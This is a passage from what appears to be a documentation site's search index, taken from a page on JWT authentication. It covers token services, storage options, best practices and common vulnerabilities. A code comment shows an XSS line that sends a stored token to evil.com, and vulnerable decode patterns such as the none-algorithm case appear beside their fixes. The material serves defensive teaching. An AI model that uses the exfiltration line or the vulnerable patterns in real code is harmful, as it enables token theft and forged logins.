cryptography.hazmat.primitives.asymmetric import rsa\n\n        # Get public key numbers\n        public_numbers = self.public_key.public_numbers()\n\n        # Convert to base64url\n        import base64\n\n        def int_to_base64url(num):\n            \"\"\"Convert integer to base64url\"\"\"\n            num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')\n            return base64.urlsafe_b64encode(num_bytes).decode('utf-8').rstrip('=')\n\n        jwks = {\n            \"keys\": [\n                {\n                    \"kty\": \"RSA\",\n                    \"use\": \"sig\",\n                    \"kid\": self.kid,\n                    \"alg\": \"RS256\",\n                    \"n\": int_to_base64url(public_numbers.n),\n                    \"e\": int_to_base64url(public_numbers.e)\n                }\n            ]\n        }\n\n        return jwks\n\n\n# Example Usage: RS256\nprint(\"\\n\" + \"=\" * 60)\nprint(\"RSA-SHA256 (RS256) Example\")\nprint(\"=\" * 60)\n\njwt_service_rsa = JWTServiceRS256()\n\n# Create token\ntoken_rsa = jwt_service_rsa.create_token(\n    user_id=\"user_67890\",\n    email=\"alice@example.com\",\n    role=\"user\",\n    expires_in=7200  # 2 hours\n)\n\nprint(f\"\\n\u2705 Generated JWT (RS256):\\n{token_rsa}\\n\")\n\n# Verify token\nresult_rsa = jwt_service_rsa.verify_token(token_rsa)\nprint(f\"\u2705 Verification Result:\")\nprint(f\"Valid: {result_rsa['valid']}\")\nif result_rsa['valid']:\n    print(f\"User ID: {result_rsa['payload']['sub']}\")\n    print(f\"Email: {result_rsa['payload']['email']}\")\n\n# Get JWKS\njwks = jwt_service_rsa.get_jwks()\nprint(f\"\\n\u2705 JWKS (Public Key Set):\")\nprint(json.dumps(jwks, indent=2))\n\n\n# ============================================================\n# 3. Complete Authentication System\n# ============================================================\n\nclass AuthenticationService:\n    \"\"\"Complete authentication service with JWT\"\"\"\n\n    def __init__(self, secret_key: str):\n        self.jwt_service = JWTServiceHS256(secret_key)\n        self.refresh_tokens = {}  # In production, use Redis/DB\n\n    def login(self, username: str, password: str):\n        \"\"\"\n        Authenticate user and return tokens.\n\n        Returns:\n            dict with access_token and refresh_token\n        \"\"\"\n        # In production: verify against database\n        if username == \"admin\" and password == \"admin123\":\n            user_id = \"user_001\"\n            email = \"admin@example.com\"\n            role = \"admin\"\n        elif username == \"user\" and password == \"user123\":\n            user_id = \"user_002\"\n            email = \"user@example.com\"\n            role = \"user\"\n        else:\n            return {\"success\": False, \"error\": \"Invalid credentials\"}\n\n        # Create access token (short-lived)\n        access_token = self.jwt_service.create_token(\n            user_id=user_id,\n            email=email,\n            role=role,\n            expires_in=900  # 15 minutes\n        )\n\n        # Create refresh token (long-lived)\n        refresh_token = self.jwt_service.create_token(\n            user_id=user_id,\n            email=email,\n            role=role,\n            expires_in=604800  # 7 days\n        )\n\n        # Store refresh token\n        self.refresh_tokens[user_id] = refresh_token\n\n        return {\n            \"success\": True,\n            \"access_token\": access_token,\n            \"refresh_token\": refresh_token,\n            \"token_type\": \"Bearer\",\n            \"expires_in\": 900\n        }\n\n    def refresh_access_token(self, refresh_token: str):\n        \"\"\"Generate new access token from refresh token\"\"\"\n        # Verify refresh token\n        result = self.jwt_service.verify_token(refresh_token)\n\n        if not result['valid']:\n            return {\"success\": False, \"error\": \"Invalid refresh token\"}\n\n        user_id = result['payload']['sub']\n\n        # Check if refresh token is in our store\n        if user_id not in self.refresh_tokens:\n            return {\"success\": False, \"error\": \"Refresh token not found\"}\n\n        # Create new access token\n        new_access_token = self.jwt_service.create_token(\n            user_id=user_id,\n            email=result['payload']['email'],\n            role=result['payload']['role'],\n            expires_in=900\n        )\n\n        return {\n            \"success\": True,\n            \"access_token\": new_access_token,\n            \"token_type\": \"Bearer\",\n            \"expires_in\": 900\n        }\n\n    def logout(self, user_id: str):\n        \"\"\"Logout user by removing refresh token\"\"\"\n        if user_id in self.refresh_tokens:\n            del self.refresh_tokens[user_id]\n        return {\"success\": True}\n\n    def validate_request(self, authorization_header: str):\n        \"\"\"Validate API request with Bearer token\"\"\"\n        if not authorization_header:\n            return {\"valid\": False, \"error\": \"No authorization header\"}\n\n        # Extract token from \"Bearer &lt;token&gt;\"\n        parts = authorization_header.split()\n        if len(parts) != 2 or parts[0] != \"Bearer\":\n            return {\"valid\": False, \"error\": \"Invalid authorization header\"}\n\n        token = parts[1]\n\n        # Verify token\n        return self.jwt_service.verify_token(\n            token,\n            expected_audience=\"https://api.myapp.com\"\n        )\n\n\n# Example Usage: Complete Auth Flow\nprint(\"\\n\" + \"=\" * 60)\nprint(\"Complete Authentication Flow\")\nprint(\"=\" * 60)\n\nauth_service = AuthenticationService(secret_key=\"my-app-secret-key-2024\")\n\n# Step 1: Login\nprint(\"\\n1\ufe0f\u20e3 User Login\")\nlogin_result = auth_service.login(\"admin\", \"admin123\")\nif login_result['success']:\n    print(f\"\u2705 Login successful\")\n    print(f\"Access Token: {login_result['access_token'][:50]}...\")\n    print(f\"Refresh Token: {login_result['refresh_token'][:50]}...\")\n    print(f\"Expires in: {login_result['expires_in']} seconds\")\n\n    access_token = login_result['access_token']\n    refresh_token = login_result['refresh_token']\n\n# Step 2: Make API request\nprint(\"\\n2\ufe0f\u20e3 Make API Request\")\nauth_header = f\"Bearer {access_token}\"\nvalidation_result = auth_service.validate_request(auth_header)\nif validation_result['valid']:\n    print(f\"\u2705 Request authorized\")\n    print(f\"User: {validation_result['payload']['email']}\")\n    print(f\"Role: {validation_result['payload']['role']}\")\n\n# Step 3: Refresh access token\nprint(\"\\n3\ufe0f\u20e3 Refresh Access Token\")\nrefresh_result = auth_service.refresh_access_token(refresh_token)\nif refresh_result['success']:\n    print(f\"\u2705 New access token generated\")\n    print(f\"New Token: {refresh_result['access_token'][:50]}...\")\n\n# Step 4: Logout\nprint(\"\\n4\ufe0f\u20e3 Logout\")\nlogout_result = auth_service.logout(\"user_001\")\nprint(f\"\u2705 Logout successful: {logout_result['success']}\")\n</code></pre>"},{"location":"security/jwt/#jwt-vs-session-comparison","title":"JWT vs Session Comparison","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    JWT vs Session-Based Auth                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502              SESSION-BASED                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Storage          \u2502 Server stores session in DB/Redis           \u2502\n\u2502 Scalability      \u2502 \u274c Requires sticky sessions or shared store \u2502\n\u2502 Database Lookup  \u2502 \u2705 Required for every request               \u2502\n\u2502 Stateful         \u2502 \u2705 Yes (server maintains state)             \u2502\n\u2502 Revocation       \u2502 \u2705 Easy (delete session from DB)            \u2502\n\u2502 Size             \u2502 Small (session ID only)                     \u2502\n\u2502 Security         \u2502 Good (server-controlled)                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502                 JWT-BASED                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Storage          \u2502 Client stores token (localStorage/cookie)   \u2502\n\u2502 Scalability      \u2502 \u2705 No server-side storage needed            \u2502\n\u2502 Database Lookup  \u2502 \u274c Not required (self-contained)            \u2502\n\u2502 Stateless        \u2502 \u2705 Yes (server is stateless)                \u2502\n\u2502 Revocation       \u2502 \u274c Difficult (need blacklist or short TTL)  \u2502\n\u2502 Size             \u2502 Large (entire payload encoded)              \u2502\n\u2502 Security         \u2502 Good (with proper implementation)           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#when-to-use-jwt-vs-sessions","title":"When to Use JWT vs Sessions","text":"<p>Use JWT When: - Building microservices architecture - Need horizontal scalability - API is consumed by multiple clients (web, mobile, IoT) - Cross-domain authentication (CORS) - Single Sign-On (SSO)</p> <p>Use Sessions When: - Monolithic application - Need instant revocation - Sensitive admin panel - Small application with single server - Compliance requires server-side control</p>"},{"location":"security/jwt/#jwt-security-best-practices","title":"JWT Security Best Practices","text":""},{"location":"security/jwt/#1-token-storage","title":"1. Token Storage","text":"<pre><code>// \u274c BAD: localStorage (vulnerable to XSS)\nlocalStorage.setItem('token', jwt);\n\n// \u2705 GOOD: HttpOnly cookie (protected from XSS)\n// Server sets cookie:\nresponse.cookie('token', jwt, {\n  httpOnly: true,    // Not accessible via JavaScript\n  secure: true,      // Only sent over HTTPS\n  sameSite: 'strict', // CSRF protection\n  maxAge: 3600000    // 1 hour\n});\n</code></pre>"},{"location":"security/jwt/#2-secret-key-security","title":"2. Secret Key Security","text":"<pre><code># \u274c BAD: Hardcoded secret\nsecret = \"mypassword123\"\n\n# \u2705 GOOD: Environment variable, strong key\nimport os\nimport secrets\n\n# Generate strong secret (one-time)\nsecret = secrets.token_urlsafe(32)\nprint(f\"Add to .env: JWT_SECRET={secret}\")\n\n# Load from environment\nsecret = os.environ.get('JWT_SECRET')\nif not secret:\n    raise ValueError(\"JWT_SECRET not set!\")\n</code></pre>"},{"location":"security/jwt/#3-token-expiration","title":"3. Token Expiration","text":"<pre><code># \u2705 GOOD: Short-lived access token + refresh token\naccess_token_ttl = 900      # 15 minutes\nrefresh_token_ttl = 604800  # 7 days\n\n# Include expiration in payload\npayload = {\n    \"exp\": datetime.utcnow() + timedelta(seconds=access_token_ttl),\n    \"iat\": datetime.utcnow(),\n    # ...\n}\n</code></pre>"},{"location":"security/jwt/#4-algorithm-selection","title":"4. Algorithm Selection","text":"<pre><code># \u274c BAD: Allow \"none\" algorithm\njwt.decode(token, verify=False)  # NEVER DO THIS!\n\n# \u274c BAD: Don't specify algorithms\njwt.decode(token, secret)\n\n# \u2705 GOOD: Explicitly specify allowed algorithms\njwt.decode(token, secret, algorithms=[\"HS256\"])\n\n# \u2705 BETTER: Use asymmetric (RS256) for production\njwt.decode(token, public_key, algorithms=[\"RS256\"])\n</code></pre>"},{"location":"security/jwt/#5-payload-security","title":"5. Payload Security","text":"<pre><code># \u274c BAD: Sensitive data in JWT\npayload = {\n    \"password\": \"secret123\",      # NEVER!\n    \"credit_card\": \"1234-5678\",   # NEVER!\n    \"ssn\": \"123-45-6789\"          # NEVER!\n}\n\n# \u2705 GOOD: Only necessary, non-sensitive data\npayload = {\n    \"sub\": \"user_123\",\n    \"email\": \"user@example.com\",\n    \"role\": \"user\",\n    \"permissions\": [\"read\"]\n}\n</code></pre>"},{"location":"security/jwt/#6-token-revocation","title":"6. Token Revocation","text":"<pre><code># Implement token blacklist for logout/compromise\nclass TokenBlacklist:\n    def __init__(self):\n        self.blacklist = set()  # In production: use Redis\n\n    def revoke(self, token):\n        \"\"\"Add token to blacklist\"\"\"\n        # Extract JTI (JWT ID) from token\n        payload = jwt.decode(token, options={\"verify_signature\": False})\n        jti = payload.get('jti')\n        if jti:\n            self.blacklist.add(jti)\n            # In production: store in Redis with TTL = token expiry\n\n    def is_revoked(self, token):\n        \"\"\"Check if token is revoked\"\"\"\n        try:\n            payload = jwt.decode(token, options={\"verify_signature\": False})\n            jti = payload.get('jti')\n            return jti in self.blacklist\n        except:\n            return True\n</code></pre>"},{"location":"security/jwt/#7-audience-validation","title":"7. Audience Validation","text":"<pre><code># \u2705 Always validate audience\npayload = {\n    \"aud\": \"https://api.myapp.com\",  # Who can use this token\n    # ...\n}\n\n# On verification\njwt.decode(\n    token,\n    secret,\n    algorithms=[\"HS256\"],\n    audience=\"https://api.myapp.com\"  # Must match!\n)\n</code></pre>"},{"location":"security/jwt/#common-jwt-vulnerabilities","title":"Common JWT Vulnerabilities","text":""},{"location":"security/jwt/#1-none-algorithm-attack","title":"1. None Algorithm Attack","text":"<pre><code># Attacker creates token with \"alg\": \"none\"\nmalicious_header = {\n    \"alg\": \"none\",\n    \"typ\": \"JWT\"\n}\nmalicious_payload = {\n    \"sub\": \"admin\",\n    \"role\": \"admin\"\n}\n\n# If server doesn't validate algorithm...\n# \u274c VULNERABLE CODE:\njwt.decode(token, verify=False)  # Accepts \"none\"!\n\n# \u2705 SECURE CODE:\njwt.decode(token, secret, algorithms=[\"HS256\"])  # Rejects \"none\"\n</code></pre>"},{"location":"security/jwt/#2-algorithm-confusion-rs256-hs256","title":"2. Algorithm Confusion (RS256 \u2192 HS256)","text":"<pre><code># Server uses RS256 (asymmetric)\n# Attacker switches to HS256 and signs with public key\n\n# \u2705 PREVENTION: Strictly enforce algorithm\njwt.decode(\n    token,\n    public_key,\n    algorithms=[\"RS256\"]  # Only allow RS256\n)\n</code></pre>"},{"location":"security/jwt/#3-weak-secret-key","title":"3. Weak Secret Key","text":"<pre><code># \u274c Weak secrets can be brute-forced\nweak_secrets = [\"secret\", \"password\", \"123456\", \"jwt\"]\n\n# \u2705 Use strong, random secrets (32+ bytes)\nimport secrets\nstrong_secret = secrets.token_urlsafe(32)\n</code></pre>"},{"location":"security/jwt/#4-token-exposure","title":"4. Token Exposure","text":"<pre><code>\u274c Exposing JWT in URLs:\nhttps://api.com/reset-password?token=eyJhbGci...\n\nProblem: Logged in browser history, server logs, proxy logs\n\n\u2705 Use POST body or Authorization header:\nAuthorization: Bearer eyJhbGci...\n</code></pre>"},{"location":"security/jwt/#how-jwt-is-stored-storage-options","title":"How JWT is Stored (Storage Options)","text":""},{"location":"security/jwt/#client-side-storage-comparison","title":"Client-Side Storage Comparison","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                   JWT Storage Options                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502          1. localStorage                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Security         \u2502 \u274c Vulnerable to XSS attacks                \u2502\n\u2502 Accessibility    \u2502 JavaScript can read/write                   \u2502\n\u2502 Auto-send        \u2502 \u274c Must manually add to requests            \u2502\n\u2502 Expiration       \u2502 \u274c No automatic expiration                  \u2502\n\u2502 Size Limit       \u2502 ~5-10 MB                                    \u2502\n\u2502 CSRF             \u2502 \u2705 Not vulnerable                           \u2502\n\u2502 Use Case         \u2502 SPAs with no sensitive data                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502          2. sessionStorage                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Security         \u2502 \u274c Vulnerable to XSS attacks                \u2502\n\u2502 Accessibility    \u2502 JavaScript can read/write                   \u2502\n\u2502 Auto-send        \u2502 \u274c Must manually add to requests            \u2502\n\u2502 Expiration       \u2502 \u2705 Cleared on tab close                     \u2502\n\u2502 Size Limit       \u2502 ~5-10 MB                                    \u2502\n\u2502 CSRF             \u2502 \u2705 Not vulnerable                           \u2502\n\u2502 Use Case         \u2502 Single-tab sessions                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502       3. Cookie (HttpOnly)                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Security         \u2502 \u2705 Protected from XSS                       \u2502\n\u2502 Accessibility    \u2502 \u274c JavaScript CANNOT read                   \u2502\n\u2502 Auto-send        \u2502 \u2705 Automatically sent with requests         \u2502\n\u2502 Expiration       \u2502 \u2705 Server-controlled                        \u2502\n\u2502 Size Limit       \u2502 ~4 KB                                       \u2502\n\u2502 CSRF             \u2502 \u26a0\ufe0f Needs CSRF protection                    \u2502\n\u2502 Use Case         \u2502 \ud83c\udfc6 RECOMMENDED for production              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502      4. Memory (JavaScript Variable)         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Security         \u2502 \u2705 Most secure (lost on refresh)            \u2502\n\u2502 Accessibility    \u2502 Only in current execution context           \u2502\n\u2502 Auto-send        \u2502 \u274c Must manually add to requests            \u2502\n\u2502 Expiration       \u2502 \u2705 Lost on page refresh                     \u2502\n\u2502 Size Limit       \u2502 No practical limit                          \u2502\n\u2502 CSRF             \u2502 \u2705 Not vulnerable                           \u2502\n\u2502 Use Case         \u2502 High-security apps (banking)                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#code-examples-storage-implementation","title":"Code Examples: Storage Implementation","text":""},{"location":"security/jwt/#1-localstorage-not-recommended","title":"1. localStorage (\u274c Not Recommended)","text":"<pre><code>// \u274c INSECURE: Vulnerable to XSS\nclass TokenStorageLocalStorage {\n    saveToken(token) {\n        localStorage.setItem('access_token', token);\n    }\n\n    getToken() {\n        return localStorage.getItem('access_token');\n    }\n\n    removeToken() {\n        localStorage.removeItem('access_token');\n    }\n\n    // Must manually add to requests\n    async makeAuthRequest(url) {\n        const token = this.getToken();\n        const response = await fetch(url, {\n            headers: {\n                'Authorization': `Bearer ${token}`\n            }\n        });\n        return response.json();\n    }\n}\n\n// XSS Attack Example:\n// If attacker injects: &lt;script&gt;\n//   fetch('https://evil.com?token=' + localStorage.getItem('access_token'))\n// &lt;/script&gt;\n// Your token is stolen! \u26a0\ufe0f\n</code></pre>"},{"location":"security/jwt/#2-httponly-cookie-recommended","title":"2. HttpOnly Cookie (\u2705 RECOMMENDED)","text":"<pre><code>// \u2705 SECURE: Protected from XSS\n// Server-side (Node.js/Express)\napp.post('/login', async (req, res) =&gt; {\n    const { username, password } = req.body;\n\n    // Authenticate user...\n    const token = generateJWT(userId);\n\n    // Set HttpOnly cookie\n    res.cookie('access_token', token, {\n        httpOnly: true,      // \u2705 Not accessible via JavaScript\n        secure: true,        // \u2705 Only sent over HTTPS\n        sameSite: 'strict',  // \u2705 CSRF protection\n        maxAge: 900000,      // 15 minutes\n        path: '/',\n        domain: '.example.com'  // Share across subdomains\n    });\n\n    res.json({ success: true });\n});\n\n// Client-side (Browser)\n// No need to manually handle token!\nasync function makeAuthRequest(url) {\n    // Cookie automatically included by browser\n    const response = await fetch(url, {\n        credentials: 'include'  // Include cookies in request\n    });\n    return response.json();\n}\n\n// Logout endpoint\napp.post('/logout', (req, res) =&gt; {\n    res.clearCookie('access_token');\n    res.json({ success: true });\n});\n</code></pre>"},{"location":"security/jwt/#3-memory-storage-highest-security","title":"3. Memory Storage (Highest Security)","text":"<pre><code>// \u2705 MOST SECURE: Lost on refresh\nclass TokenStorageMemory {\n    constructor() {\n        this.token = null;  // Only in memory\n    }\n\n    saveToken(token) {\n        this.token = token;\n    }\n\n    getToken() {\n        return this.token;\n    }\n\n    removeToken() {\n        this.token = null;\n    }\n}\n\n// Token lost on page refresh\n// User must login again\n// Best for banking/financial apps\n</code></pre>"},{"location":"security/jwt/#4-hybrid-approach-best-practice","title":"4. Hybrid Approach (Best Practice)","text":"<pre><code>// \u2705 BEST PRACTICE: HttpOnly cookie + localStorage for metadata\n// Server sets HttpOnly cookie with JWT\napp.post('/login', (req, res) =&gt; {\n    const token = generateJWT(userId);\n\n    // JWT in HttpOnly cookie\n    res.cookie('access_token', token, {\n        httpOnly: true,\n        secure: true,\n        sameSite: 'strict',\n        maxAge: 900000\n    });\n\n    // Non-sensitive metadata in response\n    res.json({\n        success: true,\n        user: {\n            id: userId,\n            name: userName,\n            role: userRole\n        },\n        expiresAt: Date.now() + 900000\n    });\n});\n\n// Client stores metadata (NOT token) in localStorage\nlocalStorage.setItem('user', JSON.stringify({\n    id: userId,\n    name: userName,\n    role: userRole\n}));\n\n// Client knows when to refresh token\nconst expiresAt = Date.now() + 900000;\nlocalStorage.setItem('token_expires_at', expiresAt);\n\n// Check if token expired (client-side)\nfunction isTokenExpired() {\n    const expiresAt = localStorage.getItem('token_expires_at');\n    return Date.now() &gt; parseInt(expiresAt);\n}\n</code></pre>"},{"location":"security/jwt/#is-jwt-stateless-or-stateful","title":"Is JWT Stateless or Stateful?","text":""},{"location":"security/jwt/#pure-jwt-stateless","title":"Pure JWT: Stateless","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 Stateless JWT Architecture                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502  Client  \u2502                              \u2502 API Server \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                              \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502  1. Request with JWT                     \u2502        \u2502\n\u2502       \u2502  Authorization: Bearer eyJhbGci...       \u2502        \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502       \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502              2. Verify JWT (NO DB LOOKUP)\u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Decode JWT   \u2502         